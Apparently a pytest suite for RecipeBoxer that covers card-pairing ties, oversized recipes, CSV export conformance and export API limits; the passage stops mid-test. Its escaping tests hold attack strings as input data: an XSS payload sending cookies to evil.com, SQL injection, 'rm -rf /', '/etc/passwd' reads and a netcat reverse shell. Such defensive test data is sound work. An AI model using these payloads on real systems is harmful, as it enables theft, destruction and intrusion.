"""
test_adversarial_recipes.py - Tier 5 Adversarial Coverage Hardening for RecipeBoxer.

Adversarial Stress Verification Suite:
1. Ambiguous Multi-Way Candidate Pairing Ties and Conflict Resolution in PairingOptimizer.
2. Massive Recipe Cards (200+ ingredients, 50+ numbered steps, HTML/XML/XSS payloads, large text blocks).
3. Plan To Eat RFC 4180 CSV Parser Conformance (quotes, delimiters, culinary Unicode, UTF-8, null chars, roundtrip fidelity).
4. Boundary Conditions on /api/export/csv (empty recipe batches, multiple rapid concurrent downloads, state guards).
"""

from __future__ import annotations

import asyncio
import csv
import io
import math
import time
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional
from unittest.mock import AsyncMock, MagicMock

import httpx
import pytest
import pytest_asyncio
from httpx import ASGITransport
from pydantic import ValidationError

from recipeboxer.agent.orchestrator import RecipeBoxerAgent
from recipeboxer.agent.session import PipelineSession, SessionManager
from recipeboxer.api.app import create_app
from recipeboxer.correlation.optimizer import PairingOptimizer
from recipeboxer.correlation.semantic import GeminiSemanticVerifier
from recipeboxer.exporter.plan_to_eat import (
    PLAN_TO_EAT_COLUMNS,
    PlanToEatExporter,
    export_recipes_to_plan_to_eat_csv,
)
from recipeboxer.extraction.extractor import GeminiRecipeExtractor
from recipeboxer.models.correlation import CorrelationProposal, CorrelationResult
from recipeboxer.models.domain import (
    ArtifactType,
    BoundaryText,
    CardQuadrant,
    CardRole,
    InkColor,
    InkInfo,
    InkType,
    PaperColorInfo,
    PaperColorTone,
    PaperRulingInfo,
    PaperRulingType,
    PhysicalArtifact,
    VisualFingerprint,
)
from recipeboxer.models.hitl import ApprovalPayload, CardPairApproval, HITLDecision
from recipeboxer.models.pipeline import PipelineStartRequest, PipelineState
from recipeboxer.models.recipe import RecipeSchema


# ============================================================================
# FIXTURES
# ============================================================================


@pytest.fixture
def adv_session_manager() -> SessionManager:
    """Isolated SessionManager instance for adversarial test runs."""
    return SessionManager()


@pytest.fixture
def adv_app(adv_session_manager: SessionManager) -> Any:
    """FastAPI test app with isolated SessionManager."""
    return create_app(session_manager=adv_session_manager)


@pytest_asyncio.fixture
async def adv_client(adv_app: Any) -> Any:
    """Async HTTP client for adversarial API route stress tests."""
    transport = ASGITransport(app=adv_app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:
        yield client


def make_test_fingerprint(
    card_id: str,
    role: CardRole = CardRole.FRONT_ONLY,
    role_confidence: float = 0.95,
    first_line: str = "Recipe Title",
    last_line: str = "End of card (over)",
    has_continuation: bool = True,
    is_cutoff: bool = False,
    hex_color: str = "#F4E8C1",
) -> VisualFingerprint:
    """Helper to construct a valid VisualFingerprint for optimizer stress testing."""
    return VisualFingerprint(
        card_id=card_id,
        image_path=f"/scans/{card_id}",
        sha256_hash=f"hash_{card_id}_{uuid.uuid4().hex[:8]}",
        role=role,
        role_confidence=role_confidence,
        paper_color=PaperColorInfo(hex_approx=hex_color, lab_l=92.0, lab_a=0.0, lab_b=10.0),
        ruling=PaperRulingInfo(has_ruling=True, ruling_type=PaperRulingType.STANDARD_RULED_BLUE),
        ink=InkInfo(ink_color=InkColor.BLUE, ink_type=InkType.BLUE_BALLPOINT),
        boundary_text=BoundaryText(
            first_line=first_line,
            last_line=last_line,
            has_continuation_symbol=has_continuation,
            is_cut_off_mid_sentence=is_cutoff,
        ),
    )


# ============================================================================
# CATEGORY 1: AMBIGUOUS MULTI-WAY PAIRING TIES & CONFLICT RESOLUTION
# ============================================================================


class TestPairingOptimizerAdversarial:
    """Adversarial stress harness for PairingOptimizer edge cases, ties, and invariants."""

    def test_optimizer_exact_score_tie_multi_front_single_back(self):
        """3 candidate fronts competing for 1 back with identical confidence (0.88).

        Verifies:
        - Exactly 1 front is paired with the back.
        - The remaining 2 fronts are listed in unmatched_card_ids.
        - Card conservation invariant holds: 2 paired + 2 unmatched = 4 total cards.
        """
        f1 = make_test_fingerprint("f1.jpg", role=CardRole.FRONT_ONLY)
        f2 = make_test_fingerprint("f2.jpg", role=CardRole.FRONT_ONLY)
        f3 = make_test_fingerprint("f3.jpg", role=CardRole.FRONT_ONLY)
        b1 = make_test_fingerprint("b1.jpg", role=CardRole.BACK_ONLY)
        fps = [f1, f2, f3, b1]

        proposals = [
            CorrelationProposal(
                proposal_id="p1",
                front_card_id="f1.jpg",
                back_card_id="b1.jpg",
                heuristic_score=0.88,
                semantic_score=0.88,
                confidence=0.88,
                is_standalone=False,
                continuity_explanation="Tie candidate 1",
                recommended_action="PAIR",
            ),
            CorrelationProposal(
                proposal_id="p2",
                front_card_id="f2.jpg",
                back_card_id="b1.jpg",
                heuristic_score=0.88,
                semantic_score=0.88,
                confidence=0.88,
                is_standalone=False,
                continuity_explanation="Tie candidate 2",
                recommended_action="PAIR",
            ),
            CorrelationProposal(
                proposal_id="p3",
                front_card_id="f3.jpg",
                back_card_id="b1.jpg",
                heuristic_score=0.88,
                semantic_score=0.88,
                confidence=0.88,
                is_standalone=False,
                continuity_explanation="Tie candidate 3",
                recommended_action="PAIR",
            ),
        ]

        optimizer = PairingOptimizer(min_pair_confidence=0.50)
        result = optimizer.optimize_proposals(fps, proposals)

        assert len(result.proposals) == 1
        matched_front = result.proposals[0].front_card_id
        matched_back = result.proposals[0].back_card_id
        assert matched_back == "b1.jpg"
        assert matched_front in ["f1.jpg", "f2.jpg", "f3.jpg"]

        # Card conservation
        assert len(result.unmatched_card_ids) == 2
        assert matched_front not in result.unmatched_card_ids
        assert matched_back not in result.unmatched_card_ids
        total_accounted = 2 * len(result.proposals) + len(result.unmatched_card_ids)
        assert total_accounted == len(fps)

    def test_optimizer_exact_score_tie_single_front_multi_back(self):
        """1 front competing for 3 candidate backs with identical confidence (0.91).

        Verifies:
        - Exactly 1 back is paired with the front.
        - The other 2 backs are unmatched.
        - Total cards accounted for equals 4.
        """
        f1 = make_test_fingerprint("f1.jpg", role=CardRole.FRONT_ONLY)
        b1 = make_test_fingerprint("b1.jpg", role=CardRole.BACK_ONLY)
        b2 = make_test_fingerprint("b2.jpg", role=CardRole.BACK_ONLY)
        b3 = make_test_fingerprint("b3.jpg", role=CardRole.BACK_ONLY)
        fps = [f1, b1, b2, b3]

        proposals = [
            CorrelationProposal(
                proposal_id="p1",
                front_card_id="f1.jpg",
                back_card_id="b1.jpg",
                heuristic_score=0.91,
                semantic_score=0.91,
                confidence=0.91,
                is_standalone=False,
                continuity_explanation="Candidate 1",
                recommended_action="PAIR",
            ),
            CorrelationProposal(
                proposal_id="p2",
                front_card_id="f1.jpg",
                back_card_id="b2.jpg",
                heuristic_score=0.91,
                semantic_score=0.91,
                confidence=0.91,
                is_standalone=False,
                continuity_explanation="Candidate 2",
                recommended_action="PAIR",
            ),
            CorrelationProposal(
                proposal_id="p3",
                front_card_id="f1.jpg",
                back_card_id="b3.jpg",
                heuristic_score=0.91,
                semantic_score=0.91,
                confidence=0.91,
                is_standalone=False,
                continuity_explanation="Candidate 3",
                recommended_action="PAIR",
            ),
        ]

        optimizer = PairingOptimizer(min_pair_confidence=0.50)
        result = optimizer.optimize_proposals(fps, proposals)

        assert len(result.proposals) == 1
        assert result.proposals[0].front_card_id == "f1.jpg"
        matched_back = result.proposals[0].back_card_id
        assert matched_back in ["b1.jpg", "b2.jpg", "b3.jpg"]

        assert len(result.unmatched_card_ids) == 2
        assert matched_back not in result.unmatched_card_ids
        total_accounted = 2 * len(result.proposals) + len(result.unmatched_card_ids)
        assert total_accounted == len(fps)

    def test_optimizer_cyclic_preference_resolution(self):
        """Cross-preference scenario:
        - F1 prefers B1 (0.95), B2 (0.85)
        - F2 prefers B1 (0.90), B2 (0.88)

        Greedy bipartite matching selects (F1, B1) with 0.95, then (F2, B2) with 0.88.
        Verifies:
        - 2 pairs produced: (F1, B1) and (F2, B2).
        - 0 unmatched cards.
        """
        f1 = make_test_fingerprint("f1.jpg", role=CardRole.FRONT_ONLY)
        f2 = make_test_fingerprint("f2.jpg", role=CardRole.FRONT_ONLY)
        b1 = make_test_fingerprint("b1.jpg", role=CardRole.BACK_ONLY)
        b2 = make_test_fingerprint("b2.jpg", role=CardRole.BACK_ONLY)
        fps = [f1, f2, b1, b2]

        proposals = [
            CorrelationProposal(
                proposal_id="p1",
                front_card_id="f1.jpg",
                back_card_id="b1.jpg",
                heuristic_score=0.95,
                semantic_score=0.95,
                confidence=0.95,
                is_standalone=False,
                continuity_explanation="Top match F1->B1",
                recommended_action="PAIR",
            ),
            CorrelationProposal(
                proposal_id="p2",
                front_card_id="f2.jpg",
                back_card_id="b1.jpg",
                heuristic_score=0.90,
                semantic_score=0.90,
                confidence=0.90,
                is_standalone=False,
                continuity_explanation="Second match F2->B1",
                recommended_action="PAIR",
            ),
            CorrelationProposal(
                proposal_id="p3",
                front_card_id="f2.jpg",
                back_card_id="b2.jpg",
                heuristic_score=0.88,
                semantic_score=0.88,
                confidence=0.88,
                is_standalone=False,
                continuity_explanation="Match F2->B2",
                recommended_action="PAIR",
            ),
            CorrelationProposal(
                proposal_id="p4",
                front_card_id="f1.jpg",
                back_card_id="b2.jpg",
                heuristic_score=0.85,
                semantic_score=0.85,
                confidence=0.85,
                is_standalone=False,
                continuity_explanation="Match F1->B2",
                recommended_action="PAIR",
            ),
        ]

        optimizer = PairingOptimizer()
        result = optimizer.optimize_proposals(fps, proposals)

        assert len(result.proposals) == 2
        pairs = {(p.front_card_id, p.back_card_id) for p in result.proposals}
        assert ("f1.jpg", "b1.jpg") in pairs
        assert ("f2.jpg", "b2.jpg") in pairs
        assert len(result.unmatched_card_ids) == 0

    def test_optimizer_dense_complete_bipartite_graph_stress(self):
        """Dense 10x10 bipartite graph (10 fronts, 10 backs, 100 proposals).

        Verifies:
        - Exactly 10 disjoint pairs formed.
        - Exactly 0 unmatched cards.
        - Every card is assigned exactly once.
        """
        n = 10
        fronts = [make_test_fingerprint(f"front_{i:02d}.jpg", role=CardRole.FRONT_ONLY) for i in range(n)]
        backs = [make_test_fingerprint(f"back_{j:02d}.jpg", role=CardRole.BACK_ONLY) for j in range(n)]
        fps = fronts + backs

        # Generate 100 proposals with distinct confidences
        proposals = []
        for i in range(n):
            for j in range(n):
                # Diagonal pairs (i==j) have highest scores
                base_score = 0.90 if i == j else 0.60
                noise = 0.01 * ((i * 7 + j * 13) % 9)
                score = round(base_score + noise, 4)
                proposals.append(
                    CorrelationProposal(
                        proposal_id=f"prop_{i}_{j}",
                        front_card_id=f"front_{i:02d}.jpg",
                        back_card_id=f"back_{j:02d}.jpg",
                        heuristic_score=score,
                        semantic_score=score,
                        confidence=score,
                        is_standalone=False,
                        continuity_explanation=f"Dense match {i}->{j}",
                        recommended_action="PAIR",
                    )
                )

        optimizer = PairingOptimizer(min_pair_confidence=0.50)
        result = optimizer.optimize_proposals(fps, proposals)

        assert len(result.proposals) == n
        assigned_fronts = {p.front_card_id for p in result.proposals}
        assigned_backs = {p.back_card_id for p in result.proposals}

        assert len(assigned_fronts) == n
        assert len(assigned_backs) == n
        assert len(result.unmatched_card_ids) == 0

    def test_optimizer_standalone_and_unmatched_cards_segregation(self):
        """Mixed scenario with paired cards, standalone cards, and unmatched noise cards.

        - 2 paired cards (F1, B1)
        - 2 standalone cards (S1, S2)
        - 2 noise/unknown cards (N1, N2)

        Verifies:
        - 1 front/back pair proposal
        - 2 standalone proposals
        - 2 unmatched card IDs (N1, N2)
        - Total cards accounted for = 6
        """
        f1 = make_test_fingerprint("f1.jpg", role=CardRole.FRONT_ONLY)
        b1 = make_test_fingerprint("b1.jpg", role=CardRole.BACK_ONLY)
        s1 = make_test_fingerprint("s1.jpg", role=CardRole.STANDALONE, role_confidence=0.92)
        s2 = make_test_fingerprint("s2.jpg", role=CardRole.STANDALONE, role_confidence=0.88)
        n1 = make_test_fingerprint("n1.jpg", role=CardRole.UNKNOWN)
        n2 = make_test_fingerprint("n2.jpg", role=CardRole.UNKNOWN)
        fps = [f1, b1, s1, s2, n1, n2]

        proposals = [
            CorrelationProposal(
                proposal_id="p1",
                front_card_id="f1.jpg",
                back_card_id="b1.jpg",
                heuristic_score=0.90,
                semantic_score=0.90,
                confidence=0.90,
                is_standalone=False,
                continuity_explanation="Valid pair",
                recommended_action="PAIR",
            )
        ]

        optimizer = PairingOptimizer()
        result = optimizer.optimize_proposals(fps, proposals)

        # 1 pair + 2 standalones = 3 proposals
        assert len(result.proposals) == 3
        pair_props = [p for p in result.proposals if not p.is_standalone]
        standalone_props = [p for p in result.proposals if p.is_standalone]

        assert len(pair_props) == 1
        assert pair_props[0].front_card_id == "f1.jpg"
        assert pair_props[0].back_card_id == "b1.jpg"

        assert len(standalone_props) == 2
        standalone_ids = {p.front_card_id for p in standalone_props}
        assert standalone_ids == {"s1.jpg", "s2.jpg"}

        assert set(result.unmatched_card_ids) == {"n1.jpg", "n2.jpg"}

    def test_optimizer_rejection_and_low_confidence_filtering(self):
        """Proposals with confidence below threshold or action REJECT must not form pairs."""
        f1 = make_test_fingerprint("f1.jpg", role=CardRole.FRONT_ONLY)
        b1 = make_test_fingerprint("b1.jpg", role=CardRole.BACK_ONLY)
        f2 = make_test_fingerprint("f2.jpg", role=CardRole.FRONT_ONLY)
        b2 = make_test_fingerprint("b2.jpg", role=CardRole.BACK_ONLY)
        fps = [f1, b1, f2, b2]

        proposals = [
            # Below 0.50 threshold
            CorrelationProposal(
                proposal_id="p1",
                front_card_id="f1.jpg",
                back_card_id="b1.jpg",
                heuristic_score=0.45,
                semantic_score=0.40,
                confidence=0.415,
                is_standalone=False,
                continuity_explanation="Low confidence",
                recommended_action="UNCERTAIN",
            ),
            # Marked as REJECT
            CorrelationProposal(
                proposal_id="p2",
                front_card_id="f2.jpg",
                back_card_id="b2.jpg",
                heuristic_score=0.75,
                semantic_score=0.20,
                confidence=0.55,
                is_standalone=False,
                continuity_explanation="Semantic mismatch",
                recommended_action="REJECT",
            ),
        ]

        optimizer = PairingOptimizer(min_pair_confidence=0.50)
        result = optimizer.optimize_proposals(fps, proposals)

        assert len(result.proposals) == 0
        assert set(result.unmatched_card_ids) == {"f1.jpg", "b1.jpg", "f2.jpg", "b2.jpg"}

    def test_optimizer_empty_and_single_card_inputs(self):
        """Boundary inputs: 0 cards, 1 standalone card, 1 unmatched front card."""
        optimizer = PairingOptimizer()

        # 0 cards
        res_empty = optimizer.optimize_proposals([], [])
        assert len(res_empty.proposals) == 0
        assert len(res_empty.unmatched_card_ids) == 0

        # 1 Standalone
        s = make_test_fingerprint("s.jpg", role=CardRole.STANDALONE, role_confidence=0.95)
        res_s = optimizer.optimize_proposals([s], [])
        assert len(res_s.proposals) == 1
        assert res_s.proposals[0].is_standalone is True
        assert res_s.proposals[0].front_card_id == "s.jpg"
        assert len(res_s.unmatched_card_ids) == 0

        # 1 Front only without back
        f = make_test_fingerprint("f.jpg", role=CardRole.FRONT_ONLY)
        res_f = optimizer.optimize_proposals([f], [])
        assert len(res_f.proposals) == 0
        assert res_f.unmatched_card_ids == ["f.jpg"]


# ============================================================================
# CATEGORY 2: MASSIVE RECIPE CARDS & INJECTION/ESCAPING STRESS
# ============================================================================


class TestMassiveRecipeCardsAndEscaping:
    """Stress tests with 200+ ingredients, 50+ directions, and HTML/XML/injection strings."""

    def test_recipe_card_250_ingredients_normalization_and_integrity(self):
        """Stress-test with 250 distinct ingredients with complex measurements."""
        raw_ingredients = [
            f"{i + 1} tbsp ingredient_{i:03d} (finely chopped & sifted, {i * 5}g)"
            for i in range(250)
        ]
        # Inject subheadings and noisy empty lines
        raw_ingredients.insert(0, "For the Dough Base:")
        raw_ingredients.insert(100, "For the Fruit Compote Filling:")
        raw_ingredients.insert(200, "For the Glaze & Garnish:")
        raw_ingredients.extend(["   ", ""])

        recipe = RecipeSchema(
            title="Massive 250-Ingredient Grand Feast Recipe",
            description="Testing schema handling of extreme 250+ ingredient lists without truncation.",
            ingredients=raw_ingredients,
            directions=["1. Combine all 250 ingredients.", "2. Bake at 375°F for 45 minutes."],
        )

        # Empty lines stripped, subheadings and items preserved
        assert len(recipe.ingredients) == 253
        assert recipe.ingredients[0] == "For the Dough Base:"
        assert recipe.ingredients[100] == "For the Fruit Compote Filling:"
        assert recipe.ingredients[200] == "For the Glaze & Garnish:"
        assert recipe.ingredients[-1] == "250 tbsp ingredient_249 (finely chopped & sifted, 1245g)"

    def test_recipe_card_75_directions_sequential_renumbering(self):
        """Stress-test with 75 directions having noisy, inconsistent numbering prefixes."""
        raw_steps = []
        for i in range(1, 76):
            if i % 5 == 0:
                raw_steps.append(f"Step {i}: Action step {i} description.")
            elif i % 5 == 1:
                raw_steps.append(f"({i}) Action step {i} description.")
            elif i % 5 == 2:
                raw_steps.append(f"{i} - Action step {i} description.")
            elif i % 5 == 3:
                raw_steps.append(f"{i}. Action step {i} description.")
            else:
                raw_steps.append(f"Action step {i} unnumbered description.")
        # Inject whitespace entries
        raw_steps.insert(10, "   ")
        raw_steps.insert(30, "")

        recipe = RecipeSchema(
            title="75-Step Confectionery Masterclass",
            ingredients=["1000g sugar", "500g butter", "200ml cream"],
            directions=raw_steps,
        )

        assert len(recipe.directions) == 75
        for idx, step in enumerate(recipe.directions, start=1):
            assert step.startswith(f"{idx}. "), f"Step {idx} incorrectly numbered: {step}"
            assert f"Action step {idx}" in step

    def test_recipe_card_html_xml_xss_escaping_payloads(self):
        """RecipeSchema safely handles and preserves HTML/XML/XSS attempt payloads."""
        xss_title = '<script>alert("XSS")</script> & <b>Chocolate</b> Soufflé'
        xss_desc = '<img src=x onerror=alert(document.cookie)> <style>body{display:none}</style>'
        xss_ingredients = [
            '<ingredient amount="2" unit="cups">all-purpose flour & <sugar></ingredient>',
            '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
            '<![CDATA[ <danger> "quotes" & \'single quotes\' ]]>',
            '&amp; &lt; &gt; &quot; &#39; &#x2F;',
        ]
        xss_directions = [
            '1. <svg onload="alert(1)"> Sift flour and baking powder.',
            '2. <iframe src="javascript:alert(2)"> Bake at 350°F.',
            '3. <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click for recipe</a>',
        ]
        xss_tags = ['<script>tag</script>', '<b>Dessert</b>', '"XSS"']
        xss_source = '<xml><author>Chef &lt;Grandma&gt;</author></xml>'

        recipe = RecipeSchema(
            title=xss_title,
            description=xss_desc,
            ingredients=xss_ingredients,
            directions=xss_directions,
            tags=xss_tags,
            source_notes=xss_source,
        )

        assert recipe.title == xss_title
        assert recipe.description == xss_desc
        assert len(recipe.ingredients) == 4
        assert len(recipe.directions) == 3
        assert recipe.directions[0].startswith("1. ")

    def test_recipe_card_sql_and_command_injection_strings(self):
        """Preserves SQL injection strings and shell meta-characters without corruption."""
        sql_title = "Delicious Pasta'; DROP TABLE recipes; SELECT * FROM users WHERE '1'='1"
        sql_desc = "Testing shell injection: `rm -rf /` $(whoami) | cat /etc/passwd & ping 127.0.0.1"
        sql_ingredients = [
            "1 cup sugar; UPDATE accounts SET balance=999999 WHERE id=1; --",
            "2 tbsp butter' OR '1'='1",
            "1/2 tsp salt && nc -e /bin/sh 10.0.0.1 4444",
        ]
        sql_directions = [
            "1. Cook pasta at 212°F; EXEC sp_msforeachtable 'DROP TABLE ?'",
            "2. {{ 7 * 7 }} ${7*7} <%= 7*7 %>",
        ]

        recipe = RecipeSchema(
            title=sql_title,
            description=sql_desc,
            ingredients=sql_ingredients,
            directions=sql_directions,
            source_notes="SQL/Command Injection Test Suite",
        )

        assert recipe.title == sql_title
        assert recipe.description == sql_desc
        assert recipe.ingredients == sql_ingredients
        assert recipe.directions[0].startswith("1. Cook pasta")
        assert recipe.directions[1].startswith("2. {{ 7 * 7 }}")

    def test_recipe_card_large_text_payload_500kb(self):
        """Massive text payload (500KB) in description and source notes completes in <500ms."""
        huge_desc = "Grandma's historical family cookbook narrative. " * 5000  # ~240KB
        huge_notes = "Archival provenance, lineage records, and culinary notes. " * 5000  # ~290KB

        start_time = time.monotonic()
        recipe = RecipeSchema(
            title="Massive Payload Heirloom Recipe",
            description=huge_desc,
            ingredients=["1 cup heirloom wheat flour", "1/2 cup fresh butter"],
            directions=["1. Knead with patience.", "2. Bake in wood-fired hearth."],
            source_notes=huge_notes,
        )
        elapsed = time.monotonic() - start_time

        assert elapsed < 0.50  # Must be fast
        assert len(recipe.description) > 200000
        assert len(recipe.source_notes) > 200000


# ============================================================================
# CATEGORY 3: PLAN TO EAT RFC 4180 CSV PARSER CONFORMANCE
# ============================================================================


class TestPlanToEatCSVParserConformance:
    """Rigorous RFC 4180 parsing conformance, edge characters, quotes, delimiters, UTF-8."""

    def test_csv_rfc4180_double_quote_escaping_stress(self):
        """RFC 4180 Section 2.7: Double quotes inside fields must be escaped with double quotes.

        Tests:
        - Titles with leading, trailing, and embedded quotes.
        - Descriptions with quotes surrounding commas.
        - DictReader exact recovery of original string.
        """
        recipe = RecipeSchema(
            title='"Grandma\'s" "Special" "Chocolate" Cake',
            description='Use 9" x 13" pan, lined with "Reynolds" parchment; bake at 350°F.',
            ingredients=[
                '2 cups "King Arthur" flour',
                '1 cup "Nestlé" chocolate chips, melted',
                '1 tbsp "pure" Mexican vanilla extract',
            ],
            directions=[
                '1. Melt chocolate in heat-safe bowl (marked "Bake-Ware").',
                '2. Fold gently; "do not" overbeat.',
                '3. Cool completely in 9" pan.',
            ],
            tags=['"Dessert"', '"Chocolate"', '"Holiday"'],
            source_notes='From the book: "The Great American Dessert Box", p. 45',
        )

        exporter = PlanToEatExporter()
        csv_str = exporter.export_to_csv_string([recipe])

        # Validate with PlanToEatExporter validator
        assert exporter.validate_csv(csv_str) is True

        # Parse with Python standard csv.DictReader
        dict_reader = csv.DictReader(io.StringIO(csv_str))
        row = next(dict_reader)

        assert row["Title"] == '"Grandma\'s" "Special" "Chocolate" Cake'
        assert row["Description"] == 'Use 9" x 13" pan, lined with "Reynolds" parchment; bake at 350°F.'
        assert '2 cups "King Arthur" flour' in row["Ingredients"]
        assert '1. Melt chocolate in heat-safe bowl (marked "Bake-Ware").' in row["Directions"]
        assert row["Tags"] == '"Dessert", "Chocolate", "Holiday"'
        assert row["Source"] == 'From the book: "The Great American Dessert Box", p. 45'

    def test_csv_rfc4180_unescaped_delimiters_and_newlines(self):
        """Fields containing commas, semicolons, tabs, and newlines must remain in single cells."""
        recipe = RecipeSchema(
            title="Peaches, Cream, Honey & Cinnamon Tart, 8-inch",
            description="A delicate tart.\nFeatures sweet ripe peaches, clover honey, and fresh cream.\nBest served warm.",
            ingredients=[
                "3 ripe peaches, peeled, pitted, and sliced",
                "1 cup heavy cream, chilled",
                "2 tbsp clover honey, warmed",
                "1/4 tsp ground cinnamon, freshly ground",
            ],
            directions=[
                "1. Arrange peach slices in concentric circles in tart crust, overlapping slightly.",
                "2. Whisk cream, honey, and cinnamon together; pour over peaches.",
                "3. Bake 30-35 mins at 375°F, until custard is set.",
            ],
            tags=["Dessert, Summer", "Fruit Tart, French", "Baking, Elegant"],
            source_notes="Summer Pastry Journal, Vol. 4, No. 2\nContributed by Chef Marie",
        )

        exporter = PlanToEatExporter()
        csv_str = exporter.export_to_csv_string([recipe])
        assert exporter.validate_csv(csv_str) is True

        # Test standard csv.reader row count and column count
        reader = csv.reader(io.StringIO(csv_str))
        rows = list(reader)
        assert len(rows) == 2  # Exactly 1 header + 1 record
        assert len(rows[1]) == 9  # Exactly 9 columns

        # Verify parsed field content
        dict_reader = csv.DictReader(io.StringIO(csv_str))
        row = next(dict_reader)
        assert row["Title"] == "Peaches, Cream, Honey & Cinnamon Tart, 8-inch"
        assert row["Description"] == "A delicate tart.\nFeatures sweet ripe peaches, clover honey, and fresh cream.\nBest served warm."
        assert len(row["Ingredients"].split("\n")) == 4
        assert len(row["Directions"].split("\n")) == 3

    def test_csv_rfc4180_culinary_unicode_and_utf8_encoding(self):
        """Culinary vulgar fractions (¼, ½, ¾, ⅓, ⅔, ⅛, ⅜, ⅝, ⅞), degrees (°F, °C), emojis, UTF-8."""
        recipe = RecipeSchema(
            title="Artisanal French Crêpes 🥞 & Berry Coulis 🍓",
            description="Authentic French crêpes with 1⅓ cups organic whole milk, 2½ tbsp melted butter 🧈, and fresh berries 🫐.",
            yield_servings="12 crêpes 🥞",
            prep_time="15 mins ⏱️",
            cook_time="20 mins 🍳",
            total_time="35 mins ⌛",
            ingredients=[
                "1 cup all-purpose flour (125g)",
                "1⅓ cups whole milk (320ml)",
                "2 large eggs (100g) 🥚",
                "2½ tbsp unsalted butter, melted (35g) 🧈",
                "⅛ tsp fine sea salt",
                "¾ cup fresh raspberries & blueberries 🫐",
            ],
            directions=[
                "1. Whisk flour, milk, eggs, melted butter 🧈, and salt until smooth (no lumps!).",
                "2. Rest batter at room temperature (68°-72°F / 20°-22°C) for 30 minutes.",
                "3. Heat 8-inch nonstick pan over medium heat (~350°F / 175°C).",
                "4. Pour ¼ cup batter, swirl quickly, and cook 1 min per side.",
                "5. Fold into quarters and serve with warm coulis 🍓.",
            ],
            tags=["Breakfast 🥞", "French 🇫🇷", "Crêpes", "Dessert 🍓"],
            source_notes="Café de Paris Recipe Box (1975) ☕",
        )

        exporter = PlanToEatExporter()
        csv_bytes = exporter.export_to_bytes([recipe])
        csv_str = csv_bytes.decode("utf-8")

        # Byte-level validation
        assert b"\xef\xbb\xbf" not in csv_bytes[:3]  # No unwanted BOM unless specified
        assert "🥞" in csv_str
        assert "1⅓ cups" in csv_str
        assert "68°-72°F / 20°-22°C" in csv_str

        # Roundtrip parse
        dict_reader = csv.DictReader(io.StringIO(csv_str))
        row = next(dict_reader)
        assert row["Title"] == "Artisanal French Crêpes 🥞 & Berry Coulis 🍓"
        assert "2½ tbsp unsalted butter, melted (35g) 🧈" in row["Ingredients"]
        assert "5. Fold into quarters and serve with warm coulis 🍓." in row["Directions"]

    def test_csv_rfc4180_null_and_control_characters(self):
        """Sanitization of control chars: tabs preserved, zero-width space, newlines normalized."""
        recipe = RecipeSchema(
            title="Sponge Cake with Secret Formula\t(Top Secret)",
            description="Contains zero-width spaces \u200b and tabs \t within text.",
            ingredients=["1\tcup\tsugar", "2\tcups\tflour", "3\teggs"],
            directions=["1.\tMix dry ingredients.", "2.\tFold gently."],
            source_notes="Lab Notebook #42\u200b\tSection B",
        )

        exporter = PlanToEatExporter()
        csv_str = exporter.export_to_csv_string([recipe])
        assert exporter.validate_csv(csv_str) is True

        reader = csv.DictReader(io.StringIO(csv_str))
        row = next(reader)
        assert row["Title"] == "Sponge Cake with Secret Formula\t(Top Secret)"
        assert "\u200b" in row["Description"]

    def test_csv_rfc4180_empty_recipe_batch_headers_only(self):
        """Empty recipe batch exports exact header row with CRLF terminator and 0 data rows."""
        exporter = PlanToEatExporter()
        csv_str = exporter.export_to_csv_string([])

        assert csv_str == "Title,Description,Ingredients,Directions,Prep Time,Total Time,Yield,Tags,Source\r\n"
        assert exporter.validate_csv(csv_str) is True

        reader = csv.reader(io.StringIO(csv_str))
        rows = list(reader)
        assert len(rows) == 1
        assert rows[0] == PLAN_TO_EAT_COLUMNS

    def test_csv_rfc4180_50_recipe_batch_alignment_stress(self):
        """50 diverse recipes serialized into 1 CSV; every row has exactly 9 columns."""
        recipes = []
        for i in range(50):
            recipes.append(
                RecipeSchema(
                    title=f"Batch Recipe #{i:02d}, with \"Quotes\" & Commas",
                    description=f"Description for recipe {i} with\nnewlines, fractions (½, ¾), and degrees (350°F).",
                    ingredients=[f"Ingredient {k} of {i}" for k in range(1, (i % 8) + 2)],
                    directions=[f"Step {k} of {i}" for k in range(1, (i % 5) + 2)],
                    prep_time=f"{i * 2} mins" if i % 2 == 0 else "",
                    cook_time=f"{i * 5} mins" if i % 3 == 0 else "",
                    total_time=f"{i * 7} mins" if i % 4 == 0 else "",
                    yield_servings=f"{i + 2} servings" if i % 2 == 1 else "",
                    tags=[f"Tag_{i}_A", f"Tag_{i}_B, Subtag"] if i % 3 != 0 else [],
                    source_notes=f"Source Box #{i}\nLine 2" if i % 2 == 0 else "",
                )
            )

        exporter = PlanToEatExporter()
        csv_str = exporter.export_to_csv_string(recipes)
        assert exporter.validate_csv(csv_str) is True

        reader = csv.reader(io.StringIO(csv_str))
        rows = list(reader)
        assert len(rows) == 51  # 1 header + 50 recipes
        for idx, row in enumerate(rows[1:], start=0):
            assert len(row) == 9, f"Row {idx} does not have 9 columns: {row}"
            assert row[0] == f"Batch Recipe #{idx:02d}, with \"Quotes\" & Commas"


# ============================================================================
# CATEGORY 4: BOUNDARY CONDITIONS ON /api/export/csv & REST ENDPOINTS
# ============================================================================


class TestAPIExportCSVBoundaryConditions:
    """Boundary conditions on /api/export/csv: concurrency, empty batches, state guards."""

    @pytest.mark.asyncio
    async def test_api_export_csv_empty_recipe_batch_returns_200_headers(
        self,
        adv_client: httpx.AsyncClient,
        adv_session_manager: SessionManager,
    ):
        """Completed session with 0 recipes (e.g. all cards rejected) returns HTTP 200 with headers."""
        session = adv_session_manager.create_session(session_id="sess_empty_completed")
        session.recipes = []
        exporter = PlanToEatExporter()
        session.csv_content = exporter.export_to_csv_string([])
        session.state = PipelineState.COMPLETED

        resp = await adv_client.get(f"/api/export/csv?session_id={session.session_id}")
        assert resp.status_code == 200
        assert "text/csv" in resp.headers["content-type"]
        assert 'attachment; filename="recipeboxer_export.csv"' in resp.headers["content-disposition"]

        reader = csv.reader(io.StringIO(resp.text))
        rows = list(reader)
        assert len(rows) == 1
        assert rows[0] == PLAN_TO_EAT_COLUMNS

    @pytest.mark.asyncio
    async def test_api_export_csv_50_concurrent_downloads_same_session(
        self,
        adv_client: httpx.AsyncClient,
        adv_session_manager: SessionManager,
    ):
        """Stress-test: 50 concurrent GET /api/export/csv requests targeting the same completed session."""
        session = adv_session_manager.create_session(session_id="sess_concurrent_50")
